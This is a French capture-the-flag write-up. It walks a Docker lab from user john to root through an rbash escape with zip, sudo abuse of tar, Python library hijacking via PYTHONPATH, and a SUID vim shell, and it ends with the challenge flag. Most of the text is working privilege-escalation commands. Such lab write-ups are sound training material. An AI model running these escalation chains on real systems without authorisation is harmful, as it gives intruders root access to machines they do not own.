# john
---
Selon la description du challenge nous avons déjà un accès en tant que john sur le docker via ssh

```
ssh john@<ip_target>
```
## Échapper rbash 
---
Lorsque que l'on teste une commande tel que id on a comme output

"Command interdite; veuillez utiliser ce bash seulement pour la commande zip"
donc seulement zip est utilisable dans ce shell
on peut contrôler ça avec
```
echo $PATH
```
/home/john/bin
donc seulement les bin du home de john sont utilisables
et on ne peut pas invoquer de binaire via leur chemin

```
/bin/id
```

-rbash: /bin/id: restricted: cannot specify `/' in command names


on peut échapper le shell via la commande de GTFOBins [https://gtfobins.org/gtfobins/zip/]

```
zip /tmp/test /etc/hosts -T -TT '/bin/bash #'
```
on obtient un shell avec un PATH différent
```
echo $PATH
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
donc on peut maintenant utiliser le reste des commandes
## sudo perm
---
énumération des droits sudoers
```
sudo -l
```
(mark) NOPASSWD: /bin/tar xf *
donc john peut exécuter en tant que mark /bin/tar xf avec n'importe quel paramètre 

on peut obtenir un shell avec mark via la commande de GTFOBins [https://gtfobins.org/gtfobins/tar/]

```
sudo -u mark /bin/tar xf /dev/null -I '/bin/sh -c "/bin/bash 0<&2 1>&2"'
```

# mark
---
## Sudo Python Library Hijacking
---
énumération des droits sudoers
```
sudo -l
```
(restadmin) SETENV: NOPASSWD: /usr/bin/python3 /home/restadmin/cleanup.py
donc mark peut lancer un script python en tant que restadmin avec l'option de définir son env
en lançant le binaire:
```
sudo -u restadmin /usr/bin/python3 /home/restadmin/cleanup.py
```
on voit que le script attend une lib archive
ModuleNotFoundError: No module named 'archive'
on peut utiliser l'option PYTHONPATH pour rediriger le script vers une librairie que l'on contrôle

```
echo 'import os; os.execl("/bin/bash", "sh")' >> /tmp/archive.py
chmod 777 /tmp/archive.py
sudo -u restadmin PYTHONPATH=/tmp /usr/bin/python3 /home/restadmin/cleanup.py
```

# restadmin
---
## SUID bit vim
---
on peut voir ça via cette commande:
```
find / -perm -4000 2>/dev/null
```
que /usr/bin/vim.basic a un suid bit 
Le binaire a aussi root comme propriétaire et seul restadmin peut l'exécuter

-rwsr-x--- 1 root restadmin 4126480 May  5 09:14 /usr/bin/vim.basic

ce qui nous permet d'ouvrir vim en tant que root;
via GTFOBins [https://gtfobins.org/gtfobins/vim/] on peut obtenir un shell avec le groupe root

```
vim -c ':python3 import os; os.setuid(0); os.execl("/bin/bash", "sh", "-p")'
```
ou via vi [https://gtfobins.org/gtfobins/vi] pour un shell plus stable

```
vim -c ':set shell=/bin/bash\ -p | shell'
```
on peut consulter le flag dans /root
interiut{J@ma1s_@sS€z_dE_dr01Ts}
